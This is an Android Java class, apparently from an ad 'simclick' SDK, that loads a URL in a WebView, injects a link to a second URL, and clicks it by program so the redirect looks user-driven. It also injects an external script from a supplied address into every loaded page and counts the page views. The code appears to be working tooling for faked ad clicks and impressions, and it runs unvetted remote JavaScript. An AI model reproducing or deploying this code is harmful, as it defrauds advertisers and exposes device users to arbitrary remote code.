package dlg.lizhihao.com.mobilezausap.SlGeneral.simclick.operation;

import android.os.Handler;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import dlg.lizhihao.com.mobilezausap.SlGeneral.simclick.common.SdkContext;
import dlg.lizhihao.com.mobilezausap.SlGeneral.simclick.exception.WebElementNotFound;
import dlg.lizhihao.com.mobilezausap.SlGeneral.simclick.robotium.By;
import dlg.lizhihao.com.mobilezausap.SlGeneral.simclick.robotium.SgSolo;
import dlg.lizhihao.com.mobilezausap.SlGeneral.simclick.util.LogUtil;
import dlg.lizhihao.com.mobilezausap.SlGeneral.simclick.util.OperationSleeper;
import dlg.lizhihao.com.mobilezausap.SlGeneral.simclick.view.CustomFloatWeb;

/**
 * Created by sogood on 16/11/8.
 */

public class LoadAndRedirectUrlOperation extends BaseOperation {

    private static final String TAG = LoadUrlOperation.class.getSimpleName();

    private WebView mWebView;
    private String mFromUrl;
    private String mToUrl;
    private  String src;

    private boolean mLoadFinish;

    public LoadAndRedirectUrlOperation(WebView webView, String fromUrl, String toUrl,String src) {
        this.mWebView = webView;
        this.mFromUrl = fromUrl;
        this.mToUrl = toUrl;
        this.src=src;
    }

    @Override
    public int doExecute(Handler handler, WebView webView, SgSolo solo) {
        final String id = "sl_sg_a";

        handler.post(new Runnable() {
            @Override
            public void run() {
                mWebView.setWebViewClient(new LoadAndRedirectUrlOperation.MyWebViewClient());
                mWebView.loadUrl(mFromUrl, CustomFloatWeb.headerMap);
            }
        });

        int loopTimes = 0;
        while (!mLoadFinish && loopTimes < (LOAD_WEB_TIMEOUT / OperationSleeper.sleepMiniDuration)) {
            OperationSleeper.sleepMini();
            loopTimes ++;
        }
        LogUtil.i(TAG, "advertising load web finish = " + mLoadFinish + ", loopTimes = " + loopTimes);

        if (!mLoadFinish) {
            return FAIL;
        }

        handler.post(new Runnable() {

            @Override
            public void run() {
                String addWebElementJs = "javascript:function a(url) {var p=document.createElement(\"a\"); p.setAttribute(\"href\",url); p.setAttribute(\"id\",\"%s\"); p.innerHTML=\"点这里\"; document.body.appendChild(p);} a(\"%s\");";
                addWebElementJs = String.format(addWebElementJs, id, mToUrl);
                LogUtil.i(TAG, "advertising  addWebElementJs = " + addWebElementJs);
                mWebView.loadUrl(addWebElementJs, CustomFloatWeb.headerMap);
            }
        });

        OperationSleeper.sleepMini();
        try {
            mLoadFinish = false;
            solo.clickOnWebElement(By.id(id));
        } catch (WebElementNotFound webElementNotFound) {
            webElementNotFound.printStackTrace();
            return FAIL;
        }

        loopTimes = 0;
        while (!mLoadFinish && loopTimes < (LOAD_WEB_TIMEOUT / OperationSleeper.sleepMiniDuration)) {
            OperationSleeper.sleepMini();
            loopTimes ++;
        }
        LogUtil.i(TAG, "advertising load web finish = " + mLoadFinish + ", loopTimes = " + loopTimes);
        return SUCC;
    }

    private class MyWebViewClient extends WebViewClient {

        @Override
        public void onPageFinished(WebView view, String url) {
            super.onPageFinished(view, url);
            if(src!=null){
                String js = "var newscript = document.createElement(\"script\");";
                js += "newscript.src=\""+src+"\";";
                js += "document.body.appendChild(newscript);";
                mWebView.loadUrl("javascript:"+js);
            }
            mLoadFinish = true;
            SdkContext.pageViewCount ++;
            LogUtil.i(TAG, "advertising onPageFinished, url = " + url);
        }
    }

}
